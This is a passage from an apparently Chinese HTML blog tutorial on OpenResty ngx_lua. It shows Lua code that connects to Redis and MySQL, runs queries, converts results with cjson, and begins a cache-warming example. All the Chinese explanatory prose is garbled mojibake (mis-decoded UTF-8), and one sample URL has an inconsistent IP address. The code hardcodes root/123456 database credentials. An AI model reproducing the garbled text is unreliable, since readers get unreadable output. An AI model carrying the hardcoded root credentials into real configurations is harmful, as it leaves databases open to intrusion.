class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">lua</span>-resty-redisæä¾›äº†è®¿é—®Redisçš„è¯¦ç»†APIï¼ŒåŒ…æ‹¬åˆ›å»ºå¯¹æ¥ã€è¿æ¥ã€æ“ä½œã€æ•°æ®å¤„ç†ç­‰ã€‚è¿™äº›APIåŸºæœ¬ä¸Šä¸Redisçš„æ“ä½œä¸€ä¸€å¯¹åº”ã€‚<br>ï¼ˆ<span class="hljs-number">1</span>ï¼‰redis = require <span class="hljs-string">&quot;resty.redis&quot;</span><br>ï¼ˆ<span class="hljs-number">2</span>ï¼‰<span class="hljs-keyword">new</span><br>è¯­æ³•: redis,err = <span class="hljs-keyword">redi</span><span class="hljs-variable">s:new</span>(),åˆ›å»ºä¸€ä¸ªRediså¯¹è±¡ã€‚<br>ï¼ˆ<span class="hljs-number">3</span>ï¼‰connect<br>è¯­æ³•:ok,err=<span class="hljs-keyword">redi</span><span class="hljs-variable">s:connect</span>(host,port[,options_table]),è®¾ç½®è¿æ¥Redisçš„è¿æ¥ä¿¡æ¯ã€‚<br>ok:è¿æ¥æˆåŠŸè¿”å› <span class="hljs-number">1</span>ï¼Œè¿æ¥å¤±è´¥è¿”å›nil<br>err:è¿”å›å¯¹åº”çš„é”™è¯¯ä¿¡æ¯<br>ï¼ˆ<span class="hljs-number">4</span>ï¼‰set_timeout<br>è¯­æ³•: <span class="hljs-keyword">redi</span><span class="hljs-variable">s:set_timeout</span>(time) ï¼Œè®¾ç½®è¯·æ±‚æ“ä½œRedisçš„è¶…æ—¶æ—¶é—´ã€‚<br>ï¼ˆ<span class="hljs-number">5</span>ï¼‰<span class="hljs-keyword">close</span><br>è¯­æ³•: ok,err = <span class="hljs-keyword">redi</span><span class="hljs-variable">s:close</span>(),å…³é—­å½“å‰è¿æ¥ï¼ŒæˆåŠŸè¿”å›<span class="hljs-number">1</span>ï¼Œå¤±è´¥è¿”å›nilå’Œé”™è¯¯ä¿¡æ¯<br>ï¼ˆ<span class="hljs-number">6</span>ï¼‰rediså‘½ä»¤å¯¹åº”çš„æ–¹æ³•<br>åœ¨<span class="hljs-keyword">lua</span>-resty-redisä¸­ï¼Œæ‰€æœ‰çš„Rediså‘½ä»¤éƒ½æœ‰è‡ªå·±çš„æ–¹æ³•ï¼Œæ–¹æ³•åå­—å’Œå‘½ä»¤åå­—ç›¸åŒï¼Œåªæ˜¯å…¨éƒ¨ä¸ºå°å†™ã€‚<br><br></code></pre></td></tr></table></figure><p>æ­¥éª¤ä¸‰:æ•ˆæœå®ç°</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">location</span> / &#123;<br>    default_type &quot;text/html&quot;;<br>    content_by_lua_block&#123;<br>        <span class="hljs-keyword">local</span> redis = require &quot;resty.redis&quot; <span class="hljs-comment">-- å¼•å…¥Redis</span><br>        <span class="hljs-keyword">local</span> redisObj = redis:<span class="hljs-built_in">new</span>()  <span class="hljs-comment">--åˆ›å»ºRediså¯¹è±¡</span><br>        redisObj:set_timeout(<span class="hljs-number">1000</span>) <span class="hljs-comment">--è®¾ç½®è¶…æ—¶æ•°æ®ä¸º1s</span><br>        <span class="hljs-keyword">local</span> ok,err = redisObj:<span class="hljs-keyword">connect</span>(&quot;192.168.200.1&quot;,<span class="hljs-number">6379</span>) <span class="hljs-comment">--è®¾ç½®redisè¿æ¥ä¿¡æ¯</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok <span class="hljs-keyword">then</span> <span class="hljs-comment">--åˆ¤æ–­æ˜¯å¦è¿æ¥æˆåŠŸ</span><br>         ngx.say(&quot;failed to connection redis&quot;,err)<br>         <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">end</span><br>        ok,err = redisObj:<span class="hljs-keyword">set</span>(&quot;username&quot;,&quot;TOM&quot;)<span class="hljs-comment">--å­˜å…¥æ•°æ®</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok <span class="hljs-keyword">then</span> <span class="hljs-comment">--åˆ¤æ–­æ˜¯å¦å­˜å…¥æˆåŠŸ</span><br>         ngx.say(&quot;failed to set username&quot;,err)<br>         <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">end</span><br>        <span class="hljs-keyword">local</span> res,err = redisObj:<span class="hljs-keyword">get</span>(&quot;username&quot;) <span class="hljs-comment">--ä»redisä¸­è·å–æ•°æ®</span><br>        ngx.say(res)<span class="hljs-comment">--å°†æ•°æ®å†™ä¼šæ¶ˆæ¯ä½“ä¸­</span><br>        redisObj:<span class="hljs-keyword">close</span>()<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¥éª¤å››:è¿è¡Œæµ‹è¯•æ•ˆæœ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604727475883.png" alt="1604727475883" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604727483869.png" alt="1604727483869" /></p><h2 id="ngx_luaæ“ä½œmysql"><a class="markdownIt-Anchor" href="#ngx_luaæ“ä½œmysql"></a> ngx_luaæ“ä½œMysql</h2><p>MySQLæ˜¯ä¸€ä¸ªä½¿ç”¨å¹¿æ³›çš„å…³ç³»å‹æ•°æ®åº“ã€‚åœ¨ngx_luaä¸­ï¼ŒMySQLæœ‰ä¸¤ç§è®¿é—®æ¨¡å¼,åˆ†åˆ«æ˜¯ä½¿</p><p>ï¼ˆ1ï¼‰ç”¨ngx_luaæ¨¡å—å’Œlua-resty-mysqlæ¨¡å—ï¼šè¿™ä¸¤ä¸ªæ¨¡å—æ˜¯å®‰è£…OpenRestyæ—¶é»˜è®¤å®‰è£…çš„ã€‚</p><p>ï¼ˆ2ï¼‰ä½¿ç”¨drizzle_nginx_module(HttpDrizzleModule)æ¨¡å—ï¼šéœ€è¦å•ç‹¬å®‰è£…ï¼Œè¿™ä¸ªåº“ç°ä¸åœ¨OpenRestyä¸­ã€‚</p><h3 id="lua-resty-mysql"><a class="markdownIt-Anchor" href="#lua-resty-mysql"></a> lua-resty-mysql</h3><p>lua-resty-mysqlæ˜¯OpenRestyå¼€å‘çš„æ¨¡å—ï¼Œä½¿ç”¨çµæ´»ã€åŠŸèƒ½å¼ºå¤§ï¼Œé€‚åˆå¤æ‚çš„ä¸šåŠ¡åœºæ™¯ï¼ŒåŒæ—¶æ”¯æŒå­˜å‚¨è¿‡ç¨‹çš„è®¿é—®ã€‚</p><h4 id="ä½¿ç”¨lua-resty-mysqlå®ç°æ•°æ®åº“çš„æŸ¥è¯¢"><a class="markdownIt-Anchor" href="#ä½¿ç”¨lua-resty-mysqlå®ç°æ•°æ®åº“çš„æŸ¥è¯¢"></a> ä½¿ç”¨lua-resty-mysqlå®ç°æ•°æ®åº“çš„æŸ¥è¯¢</h4><p>æ­¥éª¤ä¸€:</p><p>å‡†å¤‡MYSQL</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.111</span><br><span class="hljs-symbol">port:</span> <span class="hljs-number">3306</span><br><span class="hljs-symbol">username:</span>root<br><span class="hljs-symbol">password:</span><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªæ•°æ®åº“è¡¨åŠè¡¨ä¸­çš„æ•°æ®ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> nginx_db;<br><br>use nginx_db;<br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users(<br>   id <span class="hljs-type">int</span> <span class="hljs-keyword">primary key</span> auto_increment,<br>   username <span class="hljs-type">varchar</span>(<span class="hljs-number">30</span>),<br>   birthday <span class="hljs-type">date</span>,<br>   salary <span class="hljs-type">double</span><br>);<br><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,birthday,salary) <span class="hljs-keyword">values</span>(<span class="hljs-keyword">null</span>,&quot;TOM&quot;,&quot;1988-11-11&quot;,<span class="hljs-number">10000.0</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,birthday,salary) <span class="hljs-keyword">values</span>(<span class="hljs-keyword">null</span>,&quot;JERRY&quot;,&quot;1989-11-11&quot;,<span class="hljs-number">20000.0</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,birthday,salary) <span class="hljs-keyword">values</span>(<span class="hljs-keyword">null</span>,&quot;ROWS&quot;,&quot;1990-11-11&quot;,<span class="hljs-number">30000.0</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,birthday,salary) <span class="hljs-keyword">values</span>(<span class="hljs-keyword">null</span>,&quot;LUCY&quot;,&quot;1991-11-11&quot;,<span class="hljs-number">40000.0</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,birthday,salary) <span class="hljs-keyword">values</span>(<span class="hljs-keyword">null</span>,&quot;JACK&quot;,&quot;1992-11-11&quot;,<span class="hljs-number">50000.0</span>);<br></code></pre></td></tr></table></figure><p>æ•°æ®åº“è¿æ¥å››è¦ç´ :</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">driverClass</span>=com.mysql.jdbc.Driver<br><span class="hljs-attr">url</span>=jdbc:mysql://<span class="hljs-number">192.168</span>.<span class="hljs-number">200.111</span>:<span class="hljs-number">3306</span>/nginx_db<br><span class="hljs-attr">username</span>=root<br><span class="hljs-attr">password</span>=<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>æ­¥éª¤äºŒ:APIå­¦ä¹ </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ï¼ˆ<span class="hljs-number">1</span>ï¼‰å¼•å…¥&quot;resty.mysql&quot;æ¨¡å—<br><span class="hljs-keyword">local</span> mysql = require &quot;resty.mysql&quot;<br>ï¼ˆ<span class="hljs-number">2</span>ï¼‰<span class="hljs-built_in">new</span><br>åˆ›å»ºä¸€ä¸ªMySQLè¿æ¥å¯¹è±¡ï¼Œé‡åˆ°é”™è¯¯æ—¶ï¼Œdbä¸ºnilï¼Œerrä¸ºé”™è¯¯æè¿°ä¿¡æ¯<br>è¯­æ³•: db,err = mysql:<span class="hljs-built_in">new</span>()<br>ï¼ˆ<span class="hljs-number">3</span>ï¼‰<span class="hljs-keyword">connect</span><br>å°è¯•è¿æ¥åˆ°ä¸€ä¸ªMySQLæœåŠ¡å™¨<br>è¯­æ³•:ok,err=db:<span class="hljs-keyword">connect</span>(<span class="hljs-keyword">options</span>),<span class="hljs-keyword">options</span>æ˜¯ä¸€ä¸ªå‚æ•°çš„Luaè¡¨ç»“æ„ï¼Œé‡Œé¢åŒ…å«æ•°æ®åº“è¿æ¥çš„ç›¸å…³ä¿¡æ¯<br>    host:æœåŠ¡å™¨ä¸»æœºåæˆ–IPåœ°å€<br>    port:æœåŠ¡å™¨ç›‘å¬ç«¯å£ï¼Œé»˜è®¤ä¸º<span class="hljs-number">3306</span><br>    <span class="hljs-keyword">user</span>:ç™»å½•çš„ç”¨æˆ·å<br>    <span class="hljs-keyword">password</span>:ç™»å½•å¯†ç <br>    <span class="hljs-keyword">database</span>:ä½¿ç”¨çš„æ•°æ®åº“å<br>ï¼ˆ<span class="hljs-number">4</span>ï¼‰set_timeout<br>è®¾ç½®å­è¯·æ±‚çš„è¶…æ—¶æ—¶é—´(ms)ï¼ŒåŒ…æ‹¬<span class="hljs-keyword">connect</span>æ–¹æ³•<br>è¯­æ³•:db:set_timeout(<span class="hljs-type">time</span>)<br>ï¼ˆ<span class="hljs-number">5</span>ï¼‰<span class="hljs-keyword">close</span><br>å…³é—­å½“å‰MySQLè¿æ¥å¹¶è¿”å›çŠ¶æ€ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›<span class="hljs-number">1</span>ï¼›å¦‚æœå‡ºç°ä»»ä½•é”™è¯¯ï¼Œåˆ™å°†è¿”å›nilå’Œé”™è¯¯æè¿°ã€‚<br>è¯­æ³•:db:<span class="hljs-keyword">close</span>()<br>ï¼ˆ<span class="hljs-number">6</span>ï¼‰send_query<br>å¼‚æ­¥å‘è¿œç¨‹MySQLå‘é€ä¸€ä¸ªæŸ¥è¯¢ã€‚å¦‚æœæˆåŠŸåˆ™è¿”å›æˆåŠŸå‘é€çš„å­—èŠ‚æ•°ï¼›å¦‚æœé”™è¯¯ï¼Œåˆ™è¿”å›nilå’Œé”™è¯¯æè¿°<br>è¯­æ³•:bytes,err=db:send_query(<span class="hljs-keyword">sql</span>)<br>ï¼ˆ<span class="hljs-number">7</span>ï¼‰read_result<br>ä»MySQLæœåŠ¡å™¨è¿”å›ç»“æœä¸­è¯»å–ä¸€è¡Œæ•°æ®ã€‚resè¿”å›ä¸€ä¸ªæè¿°OKåŒ…æˆ–ç»“æœé›†åŒ…çš„Luaè¡¨,è¯­æ³•:<br>res, err, errcode, <span class="hljs-built_in">sqlstate</span> = db:read_result() <br>res, err, errcode, <span class="hljs-built_in">sqlstate</span> = db:read_result(<span class="hljs-keyword">rows</span>) :<span class="hljs-keyword">rows</span>æŒ‡å®šè¿”å›ç»“æœé›†çš„æœ€å¤§å€¼ï¼Œé»˜è®¤ä¸º<span class="hljs-number">4</span><br>å¦‚æœæ˜¯æŸ¥è¯¢ï¼Œåˆ™è¿”å›ä¸€ä¸ªå®¹çº³å¤šè¡Œçš„æ•°ç»„ã€‚æ¯è¡Œæ˜¯ä¸€ä¸ªæ•°æ®åˆ—çš„key-<span class="hljs-keyword">value</span>å¯¹ï¼Œå¦‚<br><br>    &#123;<br>      &#123;id=<span class="hljs-number">1</span>,username=&quot;TOM&quot;,birthday=&quot;1988-11-11&quot;,salary=<span class="hljs-number">10000.0</span>&#125;,<br>      &#123;id=<span class="hljs-number">2</span>,username=&quot;JERRY&quot;,birthday=&quot;1989-11-11&quot;,salary=<span class="hljs-number">20000.0</span>&#125;<br>    &#125;<br>å¦‚æœæ˜¯å¢åˆ æ”¹ï¼Œåˆ™è¿”å›ç±»ä¸Šå¦‚ä¸‹æ•°æ®<br>    &#123;<br>    insert_id = <span class="hljs-number">0</span>,<br>    server_status=<span class="hljs-number">2</span>,<br>    warning_count=<span class="hljs-number">1</span>,<br>    affected_rows=<span class="hljs-number">2</span>,<br>    message=nil<br>    &#125;<br>è¿”å›å€¼:<br>res:æ“ä½œçš„ç»“æœé›†<br>err:é”™è¯¯ä¿¡æ¯<br>errcode:MySQLçš„é”™è¯¯ç ï¼Œæ¯”å¦‚<span class="hljs-number">1064</span><br><span class="hljs-built_in">sqlstate</span>:è¿”å›ç”±<span class="hljs-number">5</span>ä¸ªå­—ç¬¦ç»„æˆçš„æ ‡å‡†<span class="hljs-keyword">SQL</span>é”™è¯¯ç ï¼Œæ¯”å¦‚<span class="hljs-number">42000</span><br><br></code></pre></td></tr></table></figure><p>æ­¥éª¤ä¸‰:æ•ˆæœå®ç°</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">location /&#123;<br>    content_by_lua_block&#123;<br>        local mysql = require <span class="hljs-string">&quot;resty.mysql&quot;</span><br>        local db = mysql:<span class="hljs-built_in">new</span>()<br>        local ok,err = db:connect&#123;<br>            host=<span class="hljs-string">&quot;192.168.200.111&quot;</span>,<br>            port=<span class="hljs-number">3306</span>,<br>            user=<span class="hljs-string">&quot;root&quot;</span>,<br>            password=<span class="hljs-string">&quot;123456&quot;</span>,<br>            database=<span class="hljs-string">&quot;nginx_db&quot;</span><br>        &#125;<br>        db:<span class="hljs-built_in">set_timeout</span>(<span class="hljs-number">1000</span>)<br><br>        db:<span class="hljs-built_in">send_query</span>(<span class="hljs-string">&quot;select * from users where id =1&quot;</span>)<br>        local res,err,errcode,sqlstate = db:<span class="hljs-built_in">read_result</span>()<br>        ngx<span class="hljs-selector-class">.say</span>(res<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.id</span>..<span class="hljs-string">&quot;,&quot;</span>.<span class="hljs-selector-class">.res</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.username</span>..<span class="hljs-string">&quot;,&quot;</span>.<span class="hljs-selector-class">.res</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.birthday</span>..<span class="hljs-string">&quot;,&quot;</span>.<span class="hljs-selector-class">.res</span><span class="hljs-selector-attr">[1]</span>.salary)<br>    db:<span class="hljs-built_in">close</span>()<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>é—®é¢˜:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.å¦‚ä½•è·å–è¿”å›æ•°æ®çš„å†…å®¹<br>2.å¦‚ä½•å®ç°æŸ¥è¯¢å¤šæ¡æ•°æ®<br>3.å¦‚ä½•å®ç°æ•°æ®åº“çš„å¢åˆ æ”¹æ“ä½œ<br></code></pre></td></tr></table></figure><h4 id="ä½¿ç”¨lua-cjsonå¤„ç†æŸ¥è¯¢ç»“æœ"><a class="markdownIt-Anchor" href="#ä½¿ç”¨lua-cjsonå¤„ç†æŸ¥è¯¢ç»“æœ"></a> ä½¿ç”¨lua-cjsonå¤„ç†æŸ¥è¯¢ç»“æœ</h4><p>é€šè¿‡ä¸Šè¿°çš„æ¡ˆä¾‹å­¦ä¹ ï¼Œread_result()å¾—åˆ°çš„ç»“æœreséƒ½æ˜¯tableç±»å‹ï¼Œè¦æƒ³åœ¨é¡µé¢ä¸Šå±•ç¤ºï¼Œå°±å¿…é¡»çŸ¥é“tableçš„å…·ä½“æ•°æ®ç»“æ„æ‰èƒ½è¿›è¡Œéå†è·å–ã€‚å¤„ç†èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä»‹ç»ä¸€ç§ç®€å•æ–¹å¼cjsonï¼Œä½¿ç”¨å®ƒå°±å¯ä»¥å°†tableç±»å‹çš„æ•°æ®è½¬æ¢æˆjsonå­—ç¬¦ä¸²ï¼ŒæŠŠjsonå­—ç¬¦ä¸²å±•ç¤ºåœ¨é¡µé¢ä¸Šå³å¯ã€‚å…·ä½“å¦‚ä½•ä½¿ç”¨?</p><p>æ­¥éª¤ä¸€ï¼šå¼•å…¥cjson</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">local</span> cjson = <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;cjson&quot;</span><br></code></pre></td></tr></table></figure><p>æ­¥éª¤äºŒï¼šè°ƒç”¨cjsonçš„encodeæ–¹æ³•è¿›è¡Œç±»å‹è½¬æ¢</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cjson.encode(res) <br></code></pre></td></tr></table></figure><p>æ­¥éª¤ä¸‰:ä½¿ç”¨</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">location</span> /&#123;<br>    content_by_lua_block&#123;<br><br>        <span class="hljs-keyword">local</span> mysql = require &quot;resty.mysql&quot;<br>        <span class="hljs-keyword">local</span> cjson = require &quot;cjson&quot;<br><br>        <span class="hljs-keyword">local</span> db = mysql:<span class="hljs-built_in">new</span>()<br><br>        <span class="hljs-keyword">local</span> ok,err = db:<span class="hljs-keyword">connect</span>&#123;<br>            host=&quot;192.168.200.111&quot;,<br>            port=<span class="hljs-number">3306</span>,<br>            <span class="hljs-keyword">user</span>=&quot;root&quot;,<br>            <span class="hljs-keyword">password</span>=&quot;123456&quot;,<br>            <span class="hljs-keyword">database</span>=&quot;nginx_db&quot;<br>        &#125;<br>        db:set_timeout(<span class="hljs-number">1000</span>)<br><br>        <span class="hljs-comment">--db:send_query(&quot;select * from users where id = 2&quot;)</span><br>        db:send_query(&quot;select * from users&quot;)<br>        <span class="hljs-keyword">local</span> res,err,errcode,<span class="hljs-built_in">sqlstate</span> = db:read_result()<br>        ngx.say(cjson.encode(res))<br>         <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> ipairs(res) <span class="hljs-keyword">do</span><br>       ngx.say(v.id..&quot;,&quot;..v.username..&quot;,&quot;..v.birthday..&quot;,&quot;..v.salary)<br>        <span class="hljs-keyword">end</span><br>    db:<span class="hljs-keyword">close</span>()<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="lua-resty-mysqlå®ç°æ•°æ®åº“çš„å¢åˆ æ”¹"><a class="markdownIt-Anchor" href="#lua-resty-mysqlå®ç°æ•°æ®åº“çš„å¢åˆ æ”¹"></a> lua-resty-mysqlå®ç°æ•°æ®åº“çš„å¢åˆ æ”¹</h4><p>ä¼˜åŒ–send_queryå’Œread_result</p><p>æœ¬æ–¹æ³•æ˜¯send_queryå’Œread_resultç»„åˆçš„å¿«æ·æ–¹æ³•ã€‚</p><p>è¯­æ³•:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">res, err, errcode, <span class="hljs-keyword">sqlstate</span> <span class="hljs-operator">=</span> db:query(<span class="hljs-keyword">sql</span>[,<span class="hljs-keyword">rows</span>])<br></code></pre></td></tr></table></figure><p>æœ‰äº†è¯¥APIï¼Œä¸Šé¢çš„ä»£ç æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œå¯¹åº”çš„ä¼˜åŒ–ï¼Œå¦‚ä¸‹:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs stata">location /&#123;<br>    content_by_lua_block&#123;<br><br>        <span class="hljs-keyword">local</span> mysql = require <span class="hljs-string">&quot;resty.mysql&quot;</span><br><br>        <span class="hljs-keyword">local</span> <span class="hljs-keyword">db</span> = mysql:new()<br><br>        <span class="hljs-keyword">local</span> ok,<span class="hljs-keyword">err</span> = <span class="hljs-keyword">db</span>:connect&#123;<br>        host=<span class="hljs-string">&quot;192.168.200.1&quot;</span>,<br>        port=3306,<br>        user=<span class="hljs-string">&quot;root&quot;</span>,<br>        password=<span class="hljs-string">&quot;123456&quot;</span>,<br>        database=<span class="hljs-string">&quot;nginx_db&quot;</span>,<br>        max_packet_size=1024,<br>        compact_arrays=false<br>        &#125;<br>        <span class="hljs-keyword">db</span>:set_timeout(1000)<br>        <span class="hljs-keyword">local</span> res,<span class="hljs-keyword">err</span>,errcode,sqlstate = <span class="hljs-keyword">db</span>:<span class="hljs-keyword">query</span>(<span class="hljs-string">&quot;select * from users&quot;</span>)<br>        --<span class="hljs-keyword">local</span> res,<span class="hljs-keyword">err</span>,errcode,sqlstate = <span class="hljs-keyword">db</span>:<span class="hljs-keyword">query</span>(<span class="hljs-string">&quot;insert into users(id,username,birthday,salary) values(null,&#x27;zhangsan&#x27;,&#x27;2020-11-11&#x27;,32222.0)&quot;</span>)<br>        --<span class="hljs-keyword">local</span> res,<span class="hljs-keyword">err</span>,errcode,sqlstate = <span class="hljs-keyword">db</span>:<span class="hljs-keyword">query</span>(<span class="hljs-string">&quot;update users set username=&#x27;lisi&#x27; where id = 6&quot;</span>)<br>        --<span class="hljs-keyword">local</span> res,<span class="hljs-keyword">err</span>,errcode,sqlstate = <span class="hljs-keyword">db</span>:<span class="hljs-keyword">query</span>(<span class="hljs-string">&quot;delete from users where id = 6&quot;</span>)<br>        <span class="hljs-keyword">db</span>:<span class="hljs-keyword">close</span>()<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç»¼åˆå°æ¡ˆä¾‹"><a class="markdownIt-Anchor" href="#ç»¼åˆå°æ¡ˆä¾‹"></a> ç»¼åˆå°æ¡ˆä¾‹</h3><p>ä½¿ç”¨ngx_luaæ¨¡å—å®ŒæˆRedisç¼“å­˜é¢„çƒ­ã€‚</p><p>åˆ†æ:</p><p>ï¼ˆ1ï¼‰å…ˆå¾—æœ‰ä¸€å¼ è¡¨(users)</p><p>ï¼ˆ2ï¼‰æµè§ˆå™¨è¾“å…¥å¦‚ä¸‹åœ°å€</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">191.168</span>.<span class="hljs-number">200.133</span>?username=TOM<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰ä»è¡¨ä¸­æŸ¥è¯¢å‡ºç¬¦åˆæ¡ä»¶çš„è®°å½•ï¼Œæ­¤æ—¶è·å–çš„ç»“æœä¸ºtableç±»å‹</p><p>ï¼ˆ4ï¼‰ä½¿ç”¨cjsonå°†tableæ•°æ®è½¬æ¢æˆjsonå­—ç¬¦ä¸²</p><p>ï¼ˆ5ï¼‰å°†æŸ¥è¯¢çš„ç»“æœæ•°æ®å­˜å…¥Redisä¸­</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 